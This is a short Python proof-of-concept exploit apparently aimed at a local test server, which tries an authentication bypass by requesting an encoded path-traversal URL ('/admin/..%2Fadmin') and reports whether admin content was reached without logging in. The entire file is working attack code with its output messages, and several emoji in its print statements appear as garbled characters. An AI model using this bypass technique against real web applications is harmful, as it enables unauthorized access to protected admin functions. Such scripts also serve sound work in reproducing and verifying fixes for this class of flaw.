import requests

TARGET = "http://localhost:3400"

protected_url = f"{TARGET}/admin"

bypass_url = f"{TARGET}/admin/..%2Fadmin"

print("[*] Attempting access to protected admin route without login...")
r1 = requests.get(protected_url, allow_redirects=False)
if r1.status_code == 302 and '/login' in r1.headers.get('Location', ''):
    print("[+] As expected, access to /admin is blocked. Redirected to login.")
else:
    print("[-] Unexpected behavior on /admin access:", r1.status_code)

print("\n[*] Attempting to exploit auth bypass with crafted URL...")
r2 = requests.get(bypass_url)

if "Bypassed access" in r2.text:
    print("[‚úÖ] Exploit successful! Accessed admin content without logging in.")
    print(f"[üîì] Response: {r2.text}")
else:
    print("[‚ùå] Exploit failed or already patched.")
    print(f"Status: {r2.status_code}, Response: {r2.text}")
